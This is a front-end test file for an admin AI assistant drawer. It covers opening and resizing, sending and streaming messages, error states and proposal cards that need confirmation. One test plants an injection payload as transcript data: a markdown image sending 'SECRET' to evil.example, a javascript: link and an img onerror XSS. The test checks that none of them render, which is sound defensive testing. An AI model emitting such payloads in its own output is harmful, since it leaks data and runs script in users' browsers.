/** @vitest-environment jsdom */
import { act, render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { withI18n } from '@/test/i18n';
import type { Locale } from '@/i18n/config';
import type { ConversationDetail, ConversationSummary, ProposalDetail } from '../types';

const nav = vi.hoisted(() => ({ pathname: '/admin/leagues' }));
vi.mock('next/navigation', () => ({ usePathname: () => nav.pathname, useRouter: () => ({ push: vi.fn(), refresh: vi.fn() }) }));

import AssistantDrawer from '../AssistantDrawer';
import AssistantWorkspace from '../AssistantWorkspace';

const C1 = '33333333-3333-4333-8333-333333333333';
const C2 = '66666666-6666-4666-8666-666666666666';
const P1 = '44444444-4444-4444-8444-444444444444';

const summary = (id: string, overrides: Partial<ConversationSummary> = {}): ConversationSummary => ({
  id,
  title: null,
  status: 'active',
  readOnly: false,
  busy: false,
  context: { area: 'leagues' },
  createdAt: '2026-10-27T10:00:00.000Z',
  lastMessageAt: '2026-10-27T10:05:00.000Z',
  version: 1,
  ...overrides,
});

const detailOf = (conversation: ConversationSummary, overrides: Partial<ConversationDetail> = {}): ConversationDetail => ({
  conversation,
  items: [],
  truncated: false,
  plan: null,
  proposals: [],
  awaitingContinue: false,
  limits: { maxTextChars: 200, conversationCapMicro: 5_000_000, conversationWarnMicro: 3_000_000 },
  capabilities: { approve: false, maxPhase: 0 },
  ...overrides,
});

interface SentMessage {
  conversation: string;
  body: Record<string, unknown>;
}

/** An in-memory stand-in for the assistant's routes. Every call is recorded; the next answer is set by the test. */
class FakeServer {
  list: ConversationSummary[] = [];
  details = new Map<string, ConversationDetail>();
  created: unknown[] = [];
  sent: SentMessage[] = [];
  requests: string[] = [];
  /** What the next message POST answers: a stream of events, or an error response. */
  nextMessage: { events: unknown[]; after?: (detail: ConversationDetail) => void } | { error: Response } = { events: [{ type: 'done', reason: 'completed', resumable: false }] };
  proposals = new Map<string, ProposalDetail>();
  listError: Response | null = null;

  handle = async (input: RequestInfo | URL, init?: RequestInit): Promise<Response> => {
    const url = new URL(String(input), 'http://localhost');
    const method = init?.method ?? 'GET';
    this.requests.push(`${method} ${url.pathname}${url.search}`);
    const path = url.pathname.replace('/api/admin/agent', '');

    if (path === '/conversations' && method === 'GET') {
      return this.listError ?? Response.json({ success: true, data: { items: this.list, total: this.list.length, limit: 50, offset: 0 } });
    }
    if (path === '/conversations' && method === 'POST') {
      const body = JSON.parse(String(init?.body)) as { seed?: unknown };
      this.created.push(body);
      const made = summary(C2, { context: (body.seed as ConversationSummary['context']) ?? null });
      this.list = [made, ...this.list];
      this.details.set(C2, detailOf(made));
      return Response.json({ success: true, data: made }, { status: 201 });
    }
    const messages = /^\/conversations\/([^/]+)\/messages$/.exec(path);
    if (messages && method === 'POST') {
      this.sent.push({ conversation: messages[1], body: JSON.parse(String(init?.body)) });
      const next = this.nextMessage;
      if ('error' in next) return next.error;
      const encoder = new TextEncoder();
      const detail = this.details.get(messages[1]);
      const stream = new ReadableStream<Uint8Array>({
        start(controller) {
          for (const event of next.events) controller.enqueue(encoder.encode(`data: ${JSON.stringify(event)}\n\n`));
          if (detail) next.after?.(detail);
          controller.close();
        },
      });
      return new Response(stream, { headers: { 'Content-Type': 'text/event-stream' } });
    }
    const conversation = /^\/conversations\/([^/]+)$/.exec(path);
    if (conversation && method === 'GET') {
      const detail = this.details.get(conversation[1]);
      return detail ? Response.json({ success: true, data: detail }) : Response.json({ success: false, error: 'Conversation not found.', code: 'conversation_not_found' }, { status: 404 });
    }
    const proposal = /^\/proposals\/([^/]+)$/.exec(path);
    if (proposal && method === 'GET') {
      const found = this.proposals.get(proposal[1]);
      return found ? Response.json({ success: true, data: found }) : Response.json({ success: false, error: 'Proposal not found.', code: 'proposal_not_found' }, { status: 404 });
    }
    return Response.json({ success: false, error: 'unexpected', code: 'unknown_error' }, { status: 500 });
  };
}

let server: FakeServer;

beforeEach(() => {
  server = new FakeServer();
  nav.pathname = '/admin/leagues';
  vi.stubGlobal('fetch', vi.fn(server.handle));
  window.localStorage.clear();
});
afterEach(() => {
  vi.unstubAllGlobals();
  window.localStorage.clear();
});

const mount = (locale: Locale = 'en') => render(withI18n(<AssistantDrawer />, { locale }));
const dialog = () => screen.getByRole('dialog', { name: 'Assistant' });
const openDrawer = async (user: ReturnType<typeof userEvent.setup>) => {
  await user.click(screen.getByRole('button', { name: 'Open assistant' }));
  return dialog();
};

describe('AssistantDrawer: opening and closing', () => {
  it('is a floating button until opened; "." opens it and Esc closes it, handing focus back', async () => {
    const user = userEvent.setup();
    mount();
    expect(screen.queryByRole('dialog')).toBeNull();
    const launcher = screen.getByRole('button', { name: 'Open assistant' });
    expect(launcher.getAttribute('title')).toBe('Press . to open the assistant, Esc to close it');

    await user.keyboard('.');
    expect(dialog()).toBeTruthy();
    expect(screen.queryByRole('button', { name: 'Open assistant' })).toBeNull();

    await user.keyboard('{Escape}');
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(document.activeElement).toBe(screen.getByRole('button', { name: 'Open assistant' }));
  });

  it('does not steal "." from a text field or a shortcut', async () => {
    const user = userEvent.setup();
    render(
      withI18n(
        <>
          <input aria-label="Search" />
          <AssistantDrawer />
        </>,
      ),
    );
    await user.type(screen.getByRole('textbox', { name: 'Search' }), 'a.b');
    expect(screen.queryByRole('dialog')).toBeNull();
    await user.keyboard('{Control>}.{/Control}');
    expect(screen.queryByRole('dialog')).toBeNull();
  });

  it('is a non-modal dialog the page behind stays usable under, with a labelled resize handle', async () => {
    const user = userEvent.setup();
    mount();
    const panel = await openDrawer(user);
    expect(panel.getAttribute('aria-modal')).toBe('false');
    expect(within(panel).getByRole('separator', { name: 'Resize assistant' })).toBeTruthy();
    expect(within(panel).getByRole('button', { name: 'Close assistant' })).toBeTruthy();
  });

  it('closes with its button too', async () => {
    const user = userEvent.setup();
    mount();
    const panel = await openDrawer(user);
    await user.click(within(panel).getByRole('button', { name: 'Close assistant' }));
    expect(screen.queryByRole('dialog')).toBeNull();
  });

  it('is absent on the assistant\'s own pages, where the page already is the assistant', () => {
    nav.pathname = '/admin/assistant/abc';
    const { container } = mount();
    expect(container.innerHTML).toBe('');
  });

  it('speaks German', async () => {
    const user = userEvent.setup();
    mount('de');
    await user.click(screen.getByRole('button', { name: 'Assistent öffnen' }));
    expect(screen.getByRole('dialog', { name: 'Assistent' })).toBeTruthy();
    expect(await screen.findByText('Noch keine Unterhaltungen. Starte eine, um eine Liga, ein Regelwerk oder ein Turnier einzurichten.')).toBeTruthy();
  });
});

describe('AssistantDrawer: conversations', () => {
  it('lists the admin\'s conversations, with a hint when there are none', async () => {
    const user = userEvent.setup();
    mount();
    await openDrawer(user);
    expect(await screen.findByText(/No conversations yet/)).toBeTruthy();

    server.list = [summary(C1, { title: 'Spring league' }), summary(C2, { readOnly: true })];
    await user.keyboard('{Escape}');
    await openDrawer(user);
    expect(await screen.findByRole('button', { name: /Spring league/ })).toBeTruthy();
    expect(screen.getByRole('button', { name: /New conversation.*Read-only/ })).toBeTruthy();
  });

  it('starts a conversation from the page it is on and shows it', async () => {
    nav.pathname = '/admin/rulesets/catalog/gen9ou';
    const user = userEvent.setup();
    mount();
    const panel = await openDrawer(user);
    await user.click(await within(panel).findByRole('button', { name: 'New conversation' }));

    expect(server.created).toEqual([{ seed: { area: 'rulesets' } }]);
    expect(await within(panel).findByRole('textbox', { name: 'Message to the assistant' })).toBeTruthy();
    expect(within(panel).getByText('The assistant can make mistakes. Check every card before you confirm.')).toBeTruthy();
    expect(within(panel).getByRole('link', { name: /Open full view/ }).getAttribute('href')).toBe(`/admin/assistant/${C2}`);
    expect(window.localStorage.getItem('plc.admin-assistant.conversation')).toBe(C2);
  });

  it('opens the conversation it showed last, and goes back to the list', async () => {
    const user = userEvent.setup();
    server.details.set(C1, detailOf(summary(C1, { title: 'Spring league' })));
    window.localStorage.setItem('plc.admin-assistant.conversation', C1);
    mount();
    const panel = await openDrawer(user);
    expect(await within(panel).findByRole('heading', { name: 'Spring league' })).toBeTruthy();

    await user.click(within(panel).getByRole('button', { name: 'Back to conversations' }));
    expect(await within(panel).findByRole('heading', { name: 'Conversations' })).toBeTruthy();
    expect(window.localStorage.getItem('plc.admin-assistant.conversation')).toBeNull();
  });

  it('says a stored conversation is gone instead of showing an empty page', async () => {
    const user = userEvent.setup();
    window.localStorage.setItem('plc.admin-assistant.conversation', C1);
    mount();
    const panel = await openDrawer(user);
    expect(await within(panel).findByText('Conversation not found.')).toBeTruthy();
    expect(within(panel).getByRole('button', { name: 'Try again' })).toBeTruthy();
  });

  it('shows why the list could not load, with a retry', async () => {
    server.listError = Response.json({ success: false, error: 'The assistant is not available.', code: 'agent_disabled' }, { status: 404 });
    const user = userEvent.setup();
    mount();
    const panel = await openDrawer(user);
    expect(await within(panel).findByText('The assistant is not available.')).toBeTruthy();
    server.listError = null;
    await user.click(within(panel).getByRole('button', { name: 'Try again' }));
    expect(await within(panel).findByText(/No conversations yet/)).toBeTruthy();
  });

  it('keeps working when the browser refuses storage', async () => {
    const user = userEvent.setup();
    const blocked = vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => {
      throw new DOMException('denied', 'SecurityError');
    });
    const blockedSet = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(() => {
      throw new DOMException('denied', 'SecurityError');
    });
    mount();
    const panel = await openDrawer(user);
    await user.click(await within(panel).findByRole('button', { name: 'New conversation' }));
    expect(await within(panel).findByRole('textbox', { name: 'Message to the assistant' })).toBeTruthy();
    blocked.mockRestore();
    blockedSet.mockRestore();
  });
});

describe('AssistantDrawer: it follows the admin around', () => {
  it('stays open, on the same conversation and with the typed text, when the admin navigates', async () => {
    const user = userEvent.setup();
    server.details.set(C1, detailOf(summary(C1, { title: 'Spring league' })));
    window.localStorage.setItem('plc.admin-assistant.conversation', C1);
    const view = mount();
    const panel = await openDrawer(user);
    const box = await within(panel).findByRole('textbox', { name: 'Message to the assistant' });
    await user.type(box, 'half a thought');

    nav.pathname = '/admin/tournaments';
    view.rerender(withI18n(<AssistantDrawer />));

    expect(dialog()).toBe(panel);
    expect((screen.getByRole('textbox', { name: 'Message to the assistant' }) as HTMLTextAreaElement).value).toBe('half a thought');
    // The conversation was not loaded a second time by the navigation.
    expect(server.requests.filter((r) => r === `GET /api/admin/agent/conversations/${C1}`)).toHaveLength(1);
  });

  it('is resizable from 420 to 720 pixels by keyboard and remembers the width', async () => {
    const user = userEvent.setup();
    mount();
    const panel = await openDrawer(user);
    const handle = within(panel).getByRole('separator');
    expect(handle.getAttribute('aria-valuenow')).toBe('420');
    expect(handle.getAttribute('aria-valuemin')).toBe('420');
    expect(handle.getAttribute('aria-valuemax')).toBe('720');

    handle.focus();
    await user.keyboard('{ArrowLeft}');
    expect(handle.getAttribute('aria-valuenow')).toBe('444');
    for (let i = 0; i < 20; i += 1) await user.keyboard('{ArrowLeft}');
    expect(handle.getAttribute('aria-valuenow')).toBe('720');
    expect(panel.style.getPropertyValue('--assistant-w')).toBe('720px');
    for (let i = 0; i < 20; i += 1) await user.keyboard('{ArrowRight}');
    expect(handle.getAttribute('aria-valuenow')).toBe('420');

    await user.keyboard('{ArrowLeft}{ArrowLeft}');
    expect(window.localStorage.getItem('plc.admin-assistant.width')).toBe('468');
    await user.keyboard('{Escape}');
    await openDrawer(user);
    expect(within(dialog()).getByRole('separator').getAttribute('aria-valuenow')).toBe('468');
  });

  it('ignores a width the browser remembered from somewhere else', async () => {
    window.localStorage.setItem('plc.admin-assistant.width', '99999');
    const user = userEvent.setup();
    mount();
    const panel = await openDrawer(user);
    expect(within(panel).getByRole('separator').getAttribute('aria-valuenow')).toBe('720');
    await user.keyboard('{Escape}');
    window.localStorage.setItem('plc.admin-assistant.width', 'wide');
    await openDrawer(user);
    expect(within(dialog()).getByRole('separator').getAttribute('aria-valuenow')).toBe('720');
  });
});

describe('the conversation: sending and following a turn', () => {
  const open = async (conversation: ConversationSummary, overrides: Partial<ConversationDetail> = {}, locale: Locale = 'en') => {
    server.details.set(conversation.id, detailOf(conversation, overrides));
    const view = render(withI18n(<AssistantWorkspace conversationId={conversation.id} variant="drawer" />, { locale }));
    const box = (await screen.findByRole('textbox', { name: locale === 'de' ? 'Nachricht an den Assistenten' : 'Message to the assistant' })) as HTMLTextAreaElement;
    return { view, box, user: userEvent.setup() };
  };

  it('sends on Enter, clears the box once the server took it, streams the answer and then shows the stored messages', async () => {
    const { box, user } = await open(summary(C1, { title: 'Spring league' }));
    server.nextMessage = {
      events: [
        { type: 'text.delta', step: 1, delta: 'Let me ' },
        { type: 'tool.start', id: 't1', name: 'league_list', label_code: 'tool.league_list' },
        { type: 'tool.end', id: 't1', name: 'league_list', ok: true },
        { type: 'text.delta', step: 2, delta: 'Done, **two** leagues.' },
        { type: 'usage', step: 2, input_tokens: 1, output_tokens: 1, cache_read_tokens: 0, cache_write_tokens: 0, cost_usd_micro: 100, conversation_usd_micro: 100, warn: false },
        { type: 'done', reason: 'completed', resumable: false },
      ],
      after: (detail) => {
        detail.items = [
          { type: 'user', seq: 1, at: '2026-10-27T10:00:00.000Z', text: 'How many leagues?' },
          { type: 'tool', seq: 2, id: 't1', name: 'league_list', status: 'ok', code: null, proposalId: null },
          { type: 'assistant', seq: 3, at: '2026-10-27T10:00:01.000Z', text: 'Done, **two** leagues.' },
        ];
      },
    };

    await user.type(box, 'How many leagues?{Enter}');

    await waitFor(() => expect(server.sent).toHaveLength(1));
    expect(server.sent[0].conversation).toBe(C1);
    expect(server.sent[0].body).toMatchObject({ text: 'How many leagues?', client_msg_id: expect.stringMatching(/^[A-Za-z0-9_-]{8,64}$/) });
    expect(box.value).toBe('');
    // Streamed and stored are the same conversation: the answer shows once, with its emphasis, after the turn ended.
    expect(await screen.findByText('two')).toBeTruthy();
    expect(screen.getByText('How many leagues?')).toBeTruthy();
    expect(await screen.findByText('Done: leagues')).toBeTruthy();
    await waitFor(() => expect(screen.getAllByText('two')).toHaveLength(1));
    expect(screen.getByRole('button', { name: 'Send' })).toBeTruthy();
  });

  it('breaks the line on Shift+Enter instead of sending', async () => {
    const { box, user } = await open(summary(C1));
    await user.type(box, 'line one{Shift>}{Enter}{/Shift}line two');
    expect(box.value).toBe('line one\nline two');
    expect(server.sent).toHaveLength(0);
  });

  it('does not send an empty message, or one over the limit, and counts the characters left', async () => {
    const { box, user } = await open(summary(C1));
    const send = screen.getByRole('button', { name: 'Send' }) as HTMLButtonElement;
    expect(send.disabled).toBe(true);
    await user.type(box, '   ');
    expect(send.disabled).toBe(true);
    await user.clear(box);
    await user.click(box);
    await user.paste('x'.repeat(190));
    expect(await screen.findByText('10 characters left')).toBeTruthy();
    expect(send.disabled).toBe(false);
    await user.paste('x'.repeat(20));
    expect(screen.getByText('Too long: shorten the message to 200 characters or fewer.')).toBeTruthy();
    expect(send.disabled).toBe(true);
    await user.keyboard('{Enter}');
    expect(server.sent).toHaveLength(0);
  });

  it('keeps what was typed and shows the refusal in the viewer\'s language when the conversation is busy', async () => {
    const { box, user } = await open(summary(C1), {}, 'de');
    server.nextMessage = { error: Response.json({ success: false, error: 'The assistant is still working on the previous message in this conversation.', code: 'agent_conversation_busy' }, { status: 409 }) };
    await user.type(box, 'Hallo');
    await user.click(screen.getByRole('button', { name: 'Senden' }));
    expect(await screen.findByText('Der Assistent arbeitet in dieser Unterhaltung noch an der vorherigen Nachricht.')).toBeTruthy();
    expect(box.value).toBe('Hallo');
  });

  it('shows a rate limit with the seconds to wait', async () => {
    const { box, user } = await open(summary(C1));
    server.nextMessage = { error: Response.json({ success: false, error: 'You are sending messages too fast. Try again in 42s.', code: 'agent_rate_limited', params: { seconds: 42 } }, { status: 429 }) };
    await user.type(box, 'again{Enter}');
    expect(await screen.findByText('You are sending messages too fast. Try again in 42s.')).toBeTruthy();
  });

  it('shows the catalogued error a turn ends with, and the budget warning', async () => {
    const { box, user } = await open(summary(C1));
    server.nextMessage = {
      events: [
        { type: 'usage', step: 1, input_tokens: 1, output_tokens: 1, cache_read_tokens: 0, cache_write_tokens: 0, cost_usd_micro: 100, conversation_usd_micro: 3_500_000, warn: true },
        { type: 'error', code: 'agent_budget_conversation' },
        { type: 'done', reason: 'budget', resumable: false },
      ],
    };
    await user.type(box, 'go{Enter}');
    expect(await screen.findByText('This conversation has reached its spending limit. Start a new conversation.')).toBeTruthy();
    // The currency sign follows the locale, so the amounts are matched without it.
    expect(screen.getByText(/This conversation has used .*3.50 of .*5.00./)).toBeTruthy();
  });

  it('shows a proposal the stream staged as a card, loaded from the card route', async () => {
    const { box, user } = await open(summary(C1));
    server.proposals.set(P1, { token: 't'.repeat(64), card: cardView() });
    server.nextMessage = {
      events: [
        { type: 'proposal', id: P1, hash: 'h'.repeat(64), preview: {} },
        { type: 'done', reason: 'completed', resumable: false },
      ],
      after: (detail) => {
        detail.proposals = [{ id: P1, kind: 'build', class: 'B', status: 'proposed', effectiveStatus: 'proposed', planCode: 'abcdef12', createdAt: '2026-10-27T10:00:00.000Z', expiresAt: '2099-01-01T00:00:00.000Z' }];
      },
    };
    await user.type(box, 'build it{Enter}');
    const card = await screen.findByRole('region', { name: 'Build' });
    expect(within(card).getByText('Create league')).toBeTruthy();
    // Phase 0: the card is complete, but Confirm stays off and says why.
    await user.click(within(card).getByRole('checkbox'));
    expect((within(card).getByRole('button', { name: 'Confirm' }) as HTMLButtonElement).disabled).toBe(true);
    expect(screen.getAllByText('The assistant can only look things up for now; changes are not switched on yet.').length).toBeGreaterThan(0);
    // Only one card, however many times the transcript was re-read.
    expect(screen.getAllByRole('region', { name: 'Build' })).toHaveLength(1);
  });

  it('puts a card where the tool result staged it, among the messages', async () => {
    server.proposals.set(P1, { token: null, card: cardView() });
    await open(summary(C1), {
      items: [
        { type: 'user', seq: 1, at: '2026-10-27T10:00:00.000Z', text: 'build it' },
        { type: 'tool', seq: 2, id: 't', name: 'propose_build', status: 'ok', code: null, proposalId: P1 },
        { type: 'assistant', seq: 3, at: '2026-10-27T10:00:02.000Z', text: 'I prepared the card.' },
      ],
      proposals: [{ id: P1, kind: 'build', class: 'B', status: 'proposed', effectiveStatus: 'proposed', planCode: 'abcdef12', createdAt: '2026-10-27T10:00:00.000Z', expiresAt: '2099-01-01T00:00:00.000Z' }],
    });
    const card = await screen.findByRole('region', { name: 'Build' });
    const text = screen.getByText('I prepared the card.');
    expect(card.compareDocumentPosition(text) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
    expect(screen.getByText('Done: card')).toBeTruthy();
  });

  it('never renders an image or a script from the assistant\'s text, whatever the transcript holds', async () => {
    await open(summary(C1), {
      items: [
        { type: 'assistant', seq: 1, at: '2026-10-27T10:00:00.000Z', text: '![x](https://evil.example/?q=SECRET) [a](javascript:alert(1)) <img src=x onerror=alert(1)>' },
      ],
    });
    const log = await screen.findByRole('log', { name: 'Conversation' });
    await waitFor(() => expect(log.textContent).toContain('x'));
    expect(log.querySelector('img')).toBeNull();
    expect(log.querySelector('a')).toBeNull();
    expect(log.innerHTML).not.toContain('evil.example');
  });

  it('shows a removed message as removed, and says older messages are not shown', async () => {
    await open(summary(C1), {
      truncated: true,
      items: [{ type: 'user', seq: 1, at: '2026-10-27T10:00:00.000Z', text: null }],
    });
    expect(await screen.findByText('This message was removed after the retention period.')).toBeTruthy();
    expect(screen.getByText('Earlier messages')).toBeTruthy();
  });

  it('is read-only after a tier change: it says so and takes no message', async () => {
    await open(summary(C1, { readOnly: true }));
    expect(await screen.findByText('Your role changed, so this conversation is read-only. Start a new conversation.')).toBeTruthy();
    expect((screen.getByRole('textbox', { name: 'Message to the assistant' }) as HTMLTextAreaElement).disabled).toBe(true);
  });

  it('offers Continue only while a harness event waits, and sends a continue turn', async () => {
    const { user } = await open(summary(C1), { awaitingContinue: true });
    await user.click(await screen.findByRole('button', { name: 'Continue' }));
    await waitFor(() => expect(server.sent).toHaveLength(1));
    expect(server.sent[0].body).toEqual({ continue: true });
  });

  it('shows no Continue when nothing waits', async () => {
    await open(summary(C1));
    expect(screen.queryByRole('button', { name: 'Continue' })).toBeNull();
  });

  it('follows a turn that runs elsewhere, and lets the admin type again once it ends', async () => {
    vi.useFakeTimers({ shouldAdvanceTime: true });
    try {
      server.details.set(C1, detailOf(summary(C1, { busy: true })));
      render(withI18n(<AssistantWorkspace conversationId={C1} variant="drawer" />));
      const box = (await screen.findByRole('textbox', { name: 'Message to the assistant' })) as HTMLTextAreaElement;
      expect(box.disabled).toBe(true);
      expect(screen.getByRole('status').textContent).toBe('The assistant is working…');

      server.details.set(C1, detailOf(summary(C1, { busy: false }), { items: [{ type: 'assistant', seq: 2, at: '2026-10-27T10:00:00.000Z', text: 'Finished while you were away.' }] }));
      await act(async () => {
        await vi.advanceTimersByTimeAsync(3100);
      });
      expect(await screen.findByText('Finished while you were away.')).toBeTruthy();
      await waitFor(() => expect(box.disabled).toBe(false));
    } finally {
      vi.useRealTimers();
    }
  });

  it('shows the plan as a chip that unfolds in the drawer', async () => {
    const { user } = await open(summary(C1), {
      plan: {
        id: 'p', mode: 'create', status: 'drafting', revision: 2, code: 'abcdef01', title: 'Gen 9 OU league', contentLocale: 'en', ready: true,
        sections: [{ section: 'league', state: 'ready', blockers: 0, rows: [{ label: 'name', value: { kind: 'text', text: 'Spring OU' } }], items: [] }],
        assumptions: [], blockers: [], warnings: [],
      },
    });
    const chip = await screen.findByRole('button', { name: 'Plan · Drafting' });
    expect(chip.getAttribute('aria-expanded')).toBe('false');
    expect(screen.queryByText('Spring OU')).toBeNull();
    await user.click(chip);
    expect(chip.getAttribute('aria-expanded')).toBe('true');
    expect(await screen.findByText('Spring OU')).toBeTruthy();
  });
});

/** A minimal Build card for the tests that need one. */
function cardView(): ProposalDetail['card'] {
  const text = (value: string) => ({ text: value, hidden: 0 });
  return {
    id: P1,
    kind: 'build',
    class: 'B',
    status: 'proposed',
    effectiveStatus: 'proposed',
    actionable: true,
    createdAt: '2026-10-27T10:00:00.000Z',
    expiresAt: new Date(Date.now() + 3_600_000).toISOString(),
    secondsLeft: 3600,
    locale: 'en',
    planCode: 'abcdef12',
    proposalHash: 'a'.repeat(64),
    previewHash: 'b'.repeat(64),
    planId: 'p',
    planRevision: 1,
    toolRegistryVersion: 'rv',
    acksRequired: ['visible_publicly'],
    card: {
      v: 1,
      kind: 'build',
      class: 'B',
      tool: 'propose_build',
      planCode: 'abcdef12',
      plan: { id: 'p', revision: 1, title: text('Gen 9 OU league'), intent: 'league', contentLocale: 'en' },
      summary: { steps: 1, creates: 1 },
      steps: [{ key: 'league', op: 'league_create', action: 'create', target: { entity: 'league', id: null, name: text('Spring OU') }, items: [], lines: [] }],
      lines: [],
      warnings: [],
      assumptions: [],
      acks: [{ id: 'visible_publicly', kind: 'checkbox' }],
      outwardEffects: [],
      reversibility: { kind: 'undoable' },
      existingEntity: false,
    },
    steps: [{ key: 'league', status: 'pending', errorCode: null, httpStatus: null, actionId: null }],
    details: [],
  };
}
